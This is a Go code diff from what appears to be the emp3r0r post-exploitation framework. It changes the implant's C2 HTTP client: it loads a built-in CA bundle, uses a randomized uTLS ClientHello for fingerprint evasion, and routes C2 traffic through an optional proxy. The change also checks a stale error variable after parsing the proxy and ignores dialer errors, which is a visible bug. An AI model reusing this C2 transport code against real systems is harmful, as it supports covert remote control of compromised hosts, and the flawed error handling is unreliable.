@@ -1,7 +1,6 @@
 package tun
 
 import (
-	"crypto/x509"
 	"log"
 	"net/http"
 	"net/url"
@@ -10,23 +9,21 @@ import (
 	utls "github.com/refraction-networking/utls"
 )
 
-var (
-
-	// CACrt for TLS server cert signing
-	CACrt = []byte(`
-[emp3r0r_ca]
-		`)
-)
+// CACrt for TLS server cert signing
+var CACrt = []byte("")
 
 // EmpHTTPClient add our CA to trusted CAs, while keeps TLS InsecureVerify on
 func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
-	// start with an empty pool
-	rootCAs := x509.NewCertPool()
+	// Extract CA bundle from built-in certs
+	rootCAs, err := ExtractCABundle()
+	if err != nil {
+		LogFatalError("ExtractCABundle: %v", err)
+	}
 
 	// C2 URL
 	c2url, err := url.Parse(c2_addr)
 	if err != nil {
-		LogFatalError("Erro parsing C2 address '%s': %v", c2_addr, err)
+		LogFatalError("Error parsing C2 address '%s': %v", c2_addr, err)
 	}
 
 	// add our cert
@@ -47,15 +44,15 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 	log.Printf("CA cert fingerprint: %s", SHA256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
-	proxyDialer, err := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
+	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
 	if proxyServer != "" {
 		// use a proxy for our HTTP client
-		proxyUrl, err := url.Parse(proxyServer)
+		proxyUrl, e := url.Parse(proxyServer)
 		if err != nil {
-			LogFatalError("Invalid proxy: %v", err)
+			LogFatalError("Invalid proxy: %v", e)
 		}
 
-		proxyDialer, err = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
+		proxyDialer, _ = makeProxyDialer(proxyUrl, config, clientHelloIDMap["hellorandomizedalpn"])
 	}
 
 	// transport of our http client, with configured TLS client
@@ -85,15 +82,7 @@ func HTTPClientWithEmpCA(target_url, proxy string) (client *http.Client) {
 	if client == nil {
 		return nil
 	}
+
 	client.Timeout = 5 * time.Second
-	rootCAs, err := x509.SystemCertPool()
-	if err != nil {
-		log.Printf("IsProxyOK system cert pool: %v", err)
-		rootCAs = x509.NewCertPool()
-	}
-	if ok := rootCAs.AppendCertsFromPEM(CACrt); !ok {
-		log.Printf("IsProxyOK: cannot append emp3r0r CA")
-		return nil
-	}
 	return
 }
